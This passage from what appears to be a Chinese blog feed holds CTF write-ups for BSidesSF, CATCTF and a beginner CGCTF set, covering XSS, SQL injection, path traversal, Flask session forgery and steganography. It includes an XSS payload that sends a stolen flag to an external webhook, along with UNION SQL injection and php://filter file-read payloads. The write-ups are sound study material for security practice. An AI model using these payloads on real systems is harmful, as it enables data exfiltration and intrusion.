7a397e7328901f82faad466e9c98cd88b979232e5a602104ee1e02b5bbe551b7f2710fa8b9748eb2766c60abf097db0d394c6716f1e375e2b663146aef7e2e8107a38c6456531a6fdbc2f4a7cfcdb97db15a004fb04e71e8a8379a017601f8fb0422414eab8a0e20093f289bed796eb82328802a65d07f312d0c9662d48aeb375a2182447a56bb9b15c4970718a0d0f8412eceedea01dbf7036469365be2bbd97c6614fc346bf1ea5074816549d8290b70343dea61c26de7449b504c172829e460ff3e96db792b44840c4db694d32ff4ec8d4eec259780fe5054819ba61aa7704b9b39984c8bba413db7311905229b0315ebce195de01e21b86f7c7e04af13ac83e9890ffa8b7e495fec83dc8ee6d2933bb9f06079ec11444498ecfbc1d26c774632783cee3e750f570ba047a214167daffa18fdf222f23fc96a1f0d6bc4d151c144650af1ff40612549e67b425e3900d3ff5980097035b857e032c5e8fb50242073f0de40fa8a619cabf6697fd6f94161aa9af6d81e530ea9b67113a3a17f47a2649cc2dd4413ea3d918ba1a736cdbb344221008bdd168a2b3c6addb8b9b121d188c3bb7800e9a2ed18c056dc1e7dca125192a4b8cb12f52f1af883c35b59b0e06f81527a8e002407df68582ffbff2f769177958ac268b5d72244a4d35533addcb468d0a616fc27fbe5e0c6355c4045fc77a08a38eccfaf7d85099c6bbe83177db77b6c32cbe1975e271aa79f6205a1adb590bebdfa40e75bd362bce0060e9f477dda0688d2417b6a2193e3aff70e23b6044ade871781c9a2c0bd13903761f1e4ecfce93f9e9ab634df21c5ff0a5c97aff62776e9f52737ed58a24c26de9a41001a82f14bc5b20decd82d0ba9666706c657433bc14b85dc48cea905d80f98a78c06c0aad3fd0f9f36911e6400da86fcc18c970f3bb402bf6c32c0918f390712426bd9acab07f4c20651375703792e49225e2f2fcbcb716df6e5f165fa5da81aac285820ca7d56ce631b9896c60539f474d863d99775d5c752a35829493f7c8f7e80fc0b77a0b77797d7c7295a6c76c7477660cd38c596bea3b2b87ba99f7d1be3723dba8fd74825124dfe433a180698dd3d5929d70bae15014d1d99fa3122b363e5bc4ddb8d50a82384f21c6316d760de24b8aecd761e0786e86b90ecf1081a91884030c471d759f7501e916ef213ccb551dd88910a1220e011cb53551eddc5541d4c7b6bca8cb8cc352e253e0a7d70d4b63e26ed2a59d9294211c35db3da30e69a65e702f7866a7fc494e7359f33add71b5bb8edbed310f974e3b04f0b7c00a254d42e96348b714b1f0e7f4ec0c26877c7b93883fe8a976fd94ebad5f3d8b21090db9bbbb8b7ae52496402efb7ef9d46843ad0c4d14dcb464c0ba3b634040204d55d79260d7211e8a6e221bd779fdcac78333c608ecbab9be454f0754a09c88d44f98376746e7d2c169ca9713126ca145a4da043d6579ed600e08c44326860b8750effbc419bcbd907474451873cbca0019aa40c7a4bb48236c2cda0eb5b37d831ae7feb1a04c039f255e305dd8f9745585830d65557ab37ba1b0e4cb04bc38cf406001b13a7ae60e41730054749227a67a1aa2160dc302d9afd4db721d5b543bb2e050d433ff52ab235d76d6169e67aa768c1aa980d67b5dc9031de3ef344980d7b5bef81d6c5271fa3d00dfad5ba9017a80db04b32097cec78ed59bd27552846d5ca9b65f50a7204c786d53a0692ba966e74a4d36d21a459e312d865704ece5204d685611bcba9d39d3882cacc59db60105c7fda567f828601429b7fb07aec961e170da855051c7435242d40c3483a04e8b3f8a8864b8d727752dea0ccd63e035b7ec4f1319dec3daf544d9e99d70f774ad870999bb6c20c7fec13dc344a3261aba965758d9daff2f8ac62ad080875f69467efbe266412a93b981dafaeb2addc1a8ac59f99663121798bdc954ebb5117c39d59ec430c2ed04300db1f453eeaa839fe198aa989a299b1cde8d5d8490ad3ff8e1635ef3deefed1055f28d989e7b4a9afd6e3eb2866afba9abd3c8ed64a9935fc90ec473aaa3e7cc58b86b9ba5f74871d72d6a69e68a8022f9f9566db592cfdf4d6c91ce2c37574a4a9cce14371273d15348a1e6a23e8d20d5f81175d2cf2a36fa460fb0e2a25a085d74636cddce770dd8000aa1907b9fb974ca9b757805b0411431034d5ac841a2a02c695d5b1f629617a8ad4b407a3b182eef9ebc56d877888914ff258653fafae835681c0cc6a5255bb49b2befcc854797b14c98d03a8fa6065ee2c568bd55c74ca4ea152b232485cbf4cf3e17775a44e584a5c63b97897be2b1740d13985aa434cfc4c622b453bc1122b189620ed48232be6674f4e07d7a860fd723e920e1698bdb2725053f8824655271dc511fd0d0cf3ca0b589faa585ae6575c44677bb24213b7748e493a098e03e488221f9741a8df379e4595180c665220091322cbc808afcb21c4992556950ebdcfd47a0656d7a4439dd3e6a5390e7cfba34f36d3d91c41962f438b64a2efbe0105468c4511604ac13db8477d86d153bccf4dcd9095758ec4bf68cbef220f9dff66334f8ec3ddc031169bf3f7805825a8b3a04cc61c098d660a6f423f07e5d418966885a6be61eb57f03a49f4d381f4c2d8d63311a1ae5534001393fa1310b966a0ae2c30b33d1aa8b79f36b8692f4f3c703e4254dbce50065134c34dbc1316f47fb1fbef7ecc744714ff95bad549d9c1ecd2160080b7794b56b9590cd4808f8d0eaf123831b94e8701c366d222b0f32fa79ba83d593f71ca3294328b6ebcd17cb88ebcf64d95a6b5343faf503677ee66321e064ee7307f8f26d41365085fa39efa33b4c5b9f9b7102c2630fead47e9d530db141649498f67b8d5bb393b77c40d43f8ab79138237a44a8b7d0a2e4a0cf7a36c057c5d900e6c1beb4771e7e0423bc917b794e932a676db0d5d13a15e4806d45396276bc0512825a548c2eaa253ff30c458c89554a6d4a3bcefdcf1b3b8156bfec57c5db3bba3be06572da5e3c620f230eb9de3c66f7833b8e2b98ee89c74582ca9edb84215f99a2f6d8367154c424635475796efda6ae25d5184182ef2d24631c42fbcc515b81f4d83ba512ff08389e2eb44dee06e09c3ddc6888931522e0eba5a25a4d4ad91c2f3ac7c5624f7e8fa993173b9406eb060f23cb7c71f1e3f3dcb5528c70854e0087c2ff8239755e5c990bcaac6d0eabb684fd13edb6de5c75d89a6afa04eb24d12f6ddd720d92de3604707c2f8b53869d5d8c654262211bf8f47215a943abcb10205064e779ef5b1b2d9b03d59e0ce979c5a159ef7b57be764fe0a893a216bbc05f5e085</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>心得</category>
      </categories>
      <tags>
        <tag>心得</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesSF CTF</title>
    <url>/2022/06/05/BSidesSF%20CTF/</url>
    <content><![CDATA[<p>这个比赛题目比较典型，有学习价值，只写了web</p>
<span id="more"></span>
<h2 id="web-tutorial-1">web-tutorial-1</h2>
<blockquote>
<p>Can you use XSS to steal the flag from the admin?</p>
<p>This challenge is sponsored by the Google Security Team. Come see our BSidesSF booth if you’re interested in joining us!</p>
</blockquote>
<p><img src="https://z4a.net/images/2022/06/05/image446bec8bee21cf99.png" alt="image446bec8bee21cf99.png"></p>
<p>payload如下:</p>
<pre><code class="hljs plaintext">&lt;script type=&quot;text/javascript&quot;&gt; (async function()&#123;navigator.sendBeacon(&quot;https://webhook.site/08022f63-cc45-4e24-b4de-fea91c310419&quot;,await fetch(&quot;https://web-tutorial-1-a1ef0161.challenges.bsidessf.net/xss-one-flag&quot;).then(r=&gt;r.text()).then(d=&gt;d))&#125;)()    &lt;/script&gt;</code></pre>
<p>得到flag     CTF{XS5-W0rks-h3r3}<img src="https://z4a.net/images/2022/06/05/image6dfb5bf21991f3cf.png" alt="image6dfb5bf21991f3cf.png"></p>
<h2 id="sequels-a-new-bug">Sequels: A New Bug</h2>
<blockquote>
<p>We’ve decided to track known Jedi and Sith, so we put together this database. Hopefully there are no bugs?</p>
</blockquote>
<p>最典型最基础的sql注入，通过这个题目再让我重新认识一下sql注入漏洞。</p>
<p><img src="https://z4a.net/images/2022/06/05/image.png" alt="image.png"></p>
<p>这是一个查询功能，能查到的名字和信息下方已经给了，随便输入一天名字发现能出现，但是加个<code>‘</code>就查不到了，存在sql’注入漏洞。</p>
<p><img src="https://z4a.net/images/2022/06/05/imaged052b7fa6b222cde.png" alt="imaged052b7fa6b222cde.png"></p>
<p><img src="https://z4a.net/images/2022/06/05/image162c2235c2bb47c1.png" alt="image162c2235c2bb47c1.png"></p>
<blockquote>
<p>对于sql注入漏洞的识别</p>
<p>首先可以试试单引号、双引号、单括号、双括号等看看是否报错，如果报错就八成存在SQL注入漏洞了。</p>
<p>其次在URL后面加and 1=1 、 and 1=2看页面是否显示一样，显示不一样的话就存在SQL注入漏洞了。</p>
</blockquote>
<p>这道题首先是猜字段</p>
<pre><code class="hljs plaintext">Darth Bane&#x27; order by 3# 返回正常</code></pre>
<p><img src="https://z4a.net/images/2022/06/05/imagea0eeb25836e0488f.png" alt="imagea0eeb25836e0488f.png"></p>
<pre><code class="hljs plaintext">Darth Bane&#x27; order by 4# 错误</code></pre>
<p><img src="https://z4a.net/images/2022/06/05/image85e18abab9e8329e.png" alt="image85e18abab9e8329e.png"></p>
<pre><code class="hljs plaintext">Darth Bane&#x27; union select 1,2,3#</code></pre>
<p><img src="https://z4a.net/images/2022/06/05/image9470a40a596c59f3.png" alt="image9470a40a596c59f3.png"></p>
<p>然后爆数据库名</p>
<pre><code class="hljs plaintext">Darth Bane&#x27; union select 1,database(),3#
//得到数据库名是sequels1</code></pre>
<p><img src="https://z4a.net/images/2022/06/05/imaged87eb02ebba26a2f.png" alt="imaged87eb02ebba26a2f.png"></p>
<p>爆表名</p>
<pre><code class="hljs plaintext">1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;sequels1&quot;#
//得到俩表，flags和jedi</code></pre>
<p><img src="https://z4a.net/images/2022/06/05/image01b5b372d130f8be.png" alt="image01b5b372d130f8be.png"></p>
<p>爆列名</p>
<pre><code class="hljs plaintext">1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flags&quot; #</code></pre>
<p><img src="https://z4a.net/images/2022/06/05/image90e879dc73490fc7.png" alt="image90e879dc73490fc7.png"></p>
<p>读取value数据，得到flag</p>
<p><img src="https://z4a.net/images/2022/06/05/image8990ed9b74398721.png" alt="image8990ed9b74398721.png"></p>
<pre><code class="hljs plaintext">CTF&#123;help_me_hacker_youre_my_only_hope&#125;</code></pre>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CATCTF</title>
    <url>/2023/01/01/CATCTF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/953d7a72-b66d-472c-b93d-d5ed39955524.png?x-oss-process=hzy" alt="img"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>2023新年跨年，别人看晚会，我打CTF，整挺好，祝大家2023年新年快乐</p>
<h1 id="web"><strong>WEB</strong></h1>
<h2 id="ez_jssolved"><strong>ez_js【SOLVED】</strong></h2>
<p>js敏感文件泄露得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-Yb3bORotH-paEf-U3At6U.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C8SGLFyTpZCAZrP9_fSz6dX.png?x-oss-process=hzy" alt="img"></p>
<p>flag{7s_g4m3_ju5t_f1nd_1t}</p>
<h2 id="ezbypasssolved"><strong>ezbypass【SOLVED】</strong></h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C86NgGGWJ9Ax4qJ2m0_5ibz.png?x-oss-process=hzy" alt="img"></p>
<p>通过回显可以得到貌似是只有admin用户名，题目说了不用爆破，通过审计js代码得知密码是md5加密形式，爆破了也没找到密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C9n--fNReRHs4IgMFj83Feu.png?x-oss-process=hzy" alt="img"></p>
<p>用dirsearch刚开始扫的时候没得到有用的信息，又扫了一次扫到了doc.html</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_eG9FA7BdJ2LtuPQITgm8b.png?x-oss-process=hzy" alt="img"></p>
<p>抓包拦截存在路径穿越漏洞，直接读flag.html即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230101144249573.png?x-oss-process=hzy" alt="image-20230101144249573"></p>
<p>cyberpeace{80cfb7b2f4862c4b717d0a92ec1ac09b}</p>
<h2 id="catcatsolved"><strong>catcat【SOLVED】</strong></h2>
<p>存在任意文件读漏洞，可以读取/etc/passwd和hosts</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C9UKspYxF5AMbRO7nz4BXon.png?x-oss-process=hzy" alt="img"><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_F08iZv3xBaalC6Bu3YIX_.png?x-oss-process=hzy" alt="img">但是读不到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-3VXZF2sBNo693V0Lf5qyf.png?x-oss-process=hzy" alt="img"></p>
<p>同时这里存在session</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C8JvprGn01H9pqIUTG0inxS.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_1gQ1QN7dLko3VyHp3da4b.png?x-oss-process=hzy" alt="img"></p>
<p>先通过任意文件读取来读源码/app/app.py</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_VN799CppOcq3bGzGARmN3.png?x-oss-process=hzy" alt="img"></p>
<p>分析源码可以看出来/admin目录访问时当session不对就会返回NONONO，/info就是任意文件读，当满足if session.get(<strong>‘admin’</strong>) == 1:就会return flag</p>
<p>其中session前半段是uuid()+*<strong>abcdefgh</strong></p>
<pre><code class="hljs plaintext">app.config[(**&#x27;SECRET_KEY&#x27;**)] = str(uuid.uuid4()).replace(**&quot;-&quot;**, **&quot;&quot;**) + **&quot;\*abcdefgh&quot;**</code></pre>
<p>先根据/proc/self/maps来获取内存情况之后再从/proc/self/mem中读取指定偏移量的内存数据，从而找到<strong>SECRET_KEY 的完整数据</strong></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-GeInujtFH3aMUAVRoUAqU.png?x-oss-process=hzy" alt="img"></p>
<p>测试后得到key：6f9ba0f4cab24776b669e16cb383d300*abcdefgh</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_VJoU8gIFInoHcvB_2kSrz.png?x-oss-process=hzy" alt="img"></p>
<p>然后使用Flask Session Cookie Decoder/Encoder进行伪造session</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C9gkfAaPpVGOp4HmCOBDifu.png?x-oss-process=hzy" alt="img"></p>
<p>验证成功密钥正确，伪造admin=1即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-HHbG-RFlPAKb8UYiFaJM5.png?x-oss-process=hzy" alt="img"></p>
<p>替换cookie得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-BJ0eA6Z9ABYfqkjjN8tVD.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230101110540019.png?x-oss-process=hzy" alt="image-20230101110540019"></p>
<p>catctf{Catch_the_c4t_HaHa}</p>
<h1 id="misc"><strong>MISC</strong></h1>
<h2 id="miao~solved"><strong>miao~【SOLVED】</strong></h2>
<p>附件给了个jpg文件，formost分离出一个wav文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C8j5o8TSbZHc7pTLQivD2Qz.png?x-oss-process=hzy" alt="img"></p>
<p>频谱中得到提示CatCTF</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_-k6VdMO1HII0A14mIPwn7.png?x-oss-process=hzy" alt="img"></p>
<p>这个应该是图片隐写解密的密钥，但是我知道的图片隐写都试了，都不行，应该是某个刁钻的罕见的隐写吧</p>
<p>1.1晚凌晨一点，突发奇想从分离出来的音频下手，使用deep发现里面还藏有flag.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C9GJfBF9LZPhrOziUWR_IFr.png?x-oss-process=hzy" alt="img"></p>
<p>decode出来flag.txt之后是</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C8UlX3GS4pJU5q0fhDyHXwT.png?x-oss-process=hzy" alt="img"></p>
<p>兽语解密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C87h_4mN55LgJnZtqjPUDGZ.png?x-oss-process=hzy" alt="img"></p>
<p>CatCTF{d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~}</p>
<h2 id="cat_jumpsolved"><strong>Cat_Jump【SOLVED】</strong></h2>
<p>通过搜索flag头，发现flag的前半部分，然后用这个前半部分去搜索，找到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_W5RckiOlB6aguimpiQQF6.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-bIy4tJuhFt4badzLy1xUz.png?x-oss-process=hzy" alt="img"></p>
<p>CatCTF{EFI_1sv3ry_funn9}</p>
<h2 id="meowmeowsolved"><strong>MeowMeow【SOLVED】</strong></h2>
<p>隐写，题目描述说都是大写字母</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C82Ft1m6SREa7i0ErKaIIyZ.png?x-oss-process=hzy" alt="img"></p>
<p>附件png图片010打开，看左边的总览最后能看到字母样</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-nwkbfbe1M94ffY7P3IdOm.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag</p>
<p>CatCTF{CAT_GOES_MEOW}</p>
<h2 id="catchcatsolved"><strong>CatchCat【SOLVED】</strong></h2>
<p>这道题目查看附件可以看到给了一堆GPS坐标</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_SyFVgOxBFh6ZocCbaD-ON.png?x-oss-process=hzy" alt="img"></p>
<p>属于GPGGA协议，分析一下列出csv表格</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C8HWLGhdUlL3rmxUYUdN-1y.png?x-oss-process=hzy" alt="img"></p>
<p>前面这些都很容易得到，需要修改一下部分数据，对时间戳进行处理</p>
<pre><code class="hljs plaintext">import csv
import os

odata = &#x27;1.csv&#x27; 
data = [] 

if not os.path.exists(odata):
    print(&#x27;wrong path!&#x27;)
    
with open(odata) as csvfile:
    csv_reader = csv.reader(csvfile)
    header = next(csv_reader) 
    for row in csv_reader:
        mm = row[1].split(&#x27;.&#x27;)[0] 
        ss = row[1].split(&#x27;.&#x27;)[1] 
        if len(mm)&lt;2:
            mm = &#x27;0&#x27; + mm 
        timestamp = &#x27;00:&#x27; + mm + &#x27;:&#x27; + ss 
        row[1] = timestamp
        data.append(row)
        
data.insert(0,header) 


with open(&#x27;2.csv&#x27;,&#x27;w&#x27;) as csvfile:
    writer = csv.writer(csvfile)    
    for row in data:
        writer.writerow(row)</code></pre>
<p>把B列，UTC时间hhmmss.sss 小时、分钟、秒 这个格式，之后将该表格导入ArcGIS Pro，即可呈现flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C9DzMnXGuRJ7LiAHu5_ES3l.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-12-31%20235055.png?x-oss-process=hzy" alt="屏幕截图 2022-12-31 235055"></p>
<p>CatCTF{GPS_M1ao}</p>
<h2 id="peekaboosolved"><strong>Peekaboo【SOLVED】</strong></h2>
<p>题目附件给的是不夜长安</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C-JaNoyl39GSbzMdaVEZsNS.png?x-oss-process=hzy" alt="img"></p>
<p>其实是社工题，图片右下角有QQ空间图标加QQ号，搜索qq号看空间</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_JXvmEq11Kw4avx1sHunv6.jpeg?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C_stxFiLTxBR5LrFSNiRY_v.jpeg?x-oss-process=hzy" alt="img"></p>
<p>然后也没得到啥有用的信息，蔡文姬试了不是，加好友也没同意，直接上bp爆破	，最终得到原来是百里玄策，所以flag为CatCTF{bailixuance}</p>
<h2 id="catflagsolved">**CatFlag【SOLVED】</h2>
<p>看题目描述</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/AgAABcay3C9qiN29sRFNrYhahCweNvW7.png?x-oss-process=hzy" alt="img"></p>
<p>附件下载之后直接cat flag得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230101111608843.png?x-oss-process=hzy" alt="image-20230101111608843"></p>
<p>CatCTF{!2023_Will_Be_Special,2022_Was_Not!}</p>
<h2 id="nepnep-祝你新年快乐啦solved"><strong>Nepnep 祝你新年快乐啦！【SOLVED】</strong></h2>
<p>看指定视频下面评论有flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230101112044270.png?x-oss-process=hzy" alt="image-20230101112044270"></p>
<p>CatCTF{H4ppy_n3w_y34r}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CGCTF</title>
    <url>/2022/03/22/CGCTF/</url>
    <content><![CDATA[<p>某大学新生题</p>
<span id="more"></span>
<h1 id="签到题">签到题</h1>
<p><img src="https://img.hzy2003628.top/ad2c4afe270374af7bc5d4339554c720.png" alt="image-20220322185411172" style="zoom:200%;">看源代码即可！</p>
<h1 id="md5-collision">md5 collision</h1>
<img src="https://img.hzy2003628.top/a96ff731f446d94dd7c67868e9d912c6.png" alt="image-20220322185443074" style="zoom:200%;">
<p>这道题只看php代码感觉是有点矛盾的，get传参a。同时还不能让a是QNKCDZO，但是又要求md51必须等于md52，而md51又是QNKCDZO的md5加密，显然这是矛盾的，通过md5加密看一下是啥样的形式。<img src="https://img.hzy2003628.top/f869ce9ebfbfe123e8fa33cd98f5aa6c.png" alt="image-20220322190407943" style="zoom:200%;"></p>
<p>是0e开头的，所以只需要让a也等于0e开头的形式就可以。这个题目利用了php弱类型。比如在<code>==</code>判等时，<code>0exxxxx</code>=<code>0xsfdsf</code>=<code>0</code>.而在源代码中直接给出了<code>QNKCDZO</code>的md5就是<code>0e</code>开头，使用a传输一个md5也是<code>0e</code>开头的即可<img src="https://img.hzy2003628.top/ad192b64ddad0b4de7b8850e89116c73.png" alt="image-20220322190801506" style="zoom:200%;"></p>
<h1 id="签到2">签到2</h1>
<img src="https://img.hzy2003628.top/e981a35eecf5cc2d517507daa4a4e83a.png" alt="image-20220322190921096" style="zoom:200%;">
<p>这道题说输入口令就可以，但是输入的时候发现只能输入11位，可以通过f12修改数据来输入</p>
<img src="https://img.hzy2003628.top/8300a44e7f754695c31ccb58e32c0dde.png" alt="image-20220322195654635" style="zoom:200%;">
<h1 id="这题不是web">这题不是WEB</h1>
<img src="https://img.hzy2003628.top/90140934b8fd06a051f17a150ad87da0.png" alt="image-20220322195854718" style="zoom:200%;">
<p>题目说这题不是web，看源代码发现也无果，结合发现这个图片应该可以下载到本地用stegsolve看一下<img src="https://img.hzy2003628.top/7ef11314c3a10514700a0be8bdb5c6fb.png" alt="image-20220322200042315" style="zoom:200%;"></p>
<h1 id="层层递进">层层递进</h1>
<img src="https://img.hzy2003628.top/d913adf704528327b08f6b3a82cd58ab.png" alt="image-20220322204944031" style="zoom:200%;">
<p>查看源码，代码审计</p>
<img src="https://img.hzy2003628.top/59b8c206f3b5a4c52e96183bdd9a8763.png" alt="image-20220322205209599" style="zoom:200%;">
<img src="https://img.hzy2003628.top/4d76bd4d7c5070eb951b85b0823794ff.png" alt="image-20220322205303809" style="zoom:200%;">
<h1 id="aaencode">AAencode</h1>
<img src="https://img.hzy2003628.top/1501ed9bbb219aa44e3e728ba20aefde.png" alt="image-20220322205400607" style="zoom:200%;">
<p>崩了，这个跳过</p>
<h1 id="单身二十年">单身二十年</h1>
<p><img src="https://img.hzy2003628.top/37a35fdf5b908f48e73389f48b93491b.png" alt="image-20220322205457034" style="zoom:200%;">既然已经说了靠手速，一般这样的题就是bp抓波send就得到flag！</p>
<h1 id="php-decode">php decode</h1>
<img src="https://img.hzy2003628.top/0410057f404f821a5bce91dfc33391bc.png" alt="image-20220322205632090" style="zoom:200%;">
<p>就是直接php运行即可，把eval改成echo，输出！</p>
<img src="https://img.hzy2003628.top/f7dc48d4935ae3efc259918963db7555.png" alt="image-20220322205859772" style="zoom:200%;">
<h1 id="文件包含">文件包含</h1>
<img src="https://img.hzy2003628.top/e6a691d4731a6629fa521ddf8aca7bf9.png" alt="image-20220322205942560" style="zoom:200%;">
<p>直接payload:</p>
<blockquote>
<p>?file=php://filter/convert.base64-encode/resource=index.php</p>
</blockquote>
<img src="https://img.hzy2003628.top/25b121ce7d95aa4acabfe9da7e527c7e.png" alt="image-20220322210311271" style="zoom:200%;">
<img src="https://img.hzy2003628.top/706d9381fa30c5a311aedb87fd680855.png" alt="image-20220322210328401" style="zoom:200%;">
<p>单身一百年也没用</p>
<img src="https://img.hzy2003628.top/ff5249d083425ab0f8552351a36f6dcf.png" alt="image-20220322210423830" style="zoom:200%;">
<p>抓包得到<img src="https://img.hzy2003628.top/df56fd89ac7353e8f3984008ca9550df.png" alt="image-20220322210537128" style="zoom:200%;"></p>
<h1 id="download~">Download~!</h1>
<p>挂了</p>
<h1 id="cookie">COOKIE</h1>
<img src="https://img.hzy2003628.top/df6769ecad9bc915ad1933f649cf6678.png" alt="image-20220322210639051" style="zoom:200%;">
<p>看cookie发现值为0，改成1试试</p>
<img src="https://img.hzy2003628.top/3b6d127f26bc29afe33c55c2e27639ba.png" alt="image-20220322211009783" style="zoom:200%;">
<h1 id="mysql">MYSQL</h1>
<img src="https://img.hzy2003628.top/2615a0d6416c0c7a5b827e8e2e3934db.png" alt="image-20220322211053784" style="zoom:200%;">
<p>访问一下robots.txt<img src="https://img.hzy2003628.top/9b15ef57092ce13430648dd43ec4e336.png" alt="image-20220322211149934" style="zoom:200%;"></p>
<p>这里只是一个提示，审计一下发现是get传参id，代码表示如果输入的值是1024，就显示no，但是测试其他数据并没有回显</p>
<p>这是考察<code>intval($_GET[id]);</code>的作用获取变量的整数值，所以只要传递一个1024的小数即可！</p>
<img src="https://img.hzy2003628.top/8ac7e111535b7a314eee425e6ba3cb40.png" alt="image-20220322211739227" style="zoom:200%;">
<h1 id="gbk-injection">GBK Injection</h1>
<img src="https://img.hzy2003628.top/ea8aadb373558431e35b207f02d3537d.png" alt="image-20220322211811210" style="zoom:200%;">
<p><code>GBK Injection</code>也就是宽字节注入，原理：</p>
<blockquote>
<p>GBK 占两个字节<br>
ASCII占一个字节<br>
常见的宽字节有: GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。<br>
通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。<br>
大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，即单引号逃逸，有了单引号就好注入了。<br>
%df吃掉 \ 具体的原因是urlencode(’) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
</blockquote>
<img src="https://img.hzy2003628.top/b36ae320898ea701af9cc36e856e6228.png" alt="image-20220322212339070" style="zoom:200%;">
<p>sql注入，得到flag！</p>
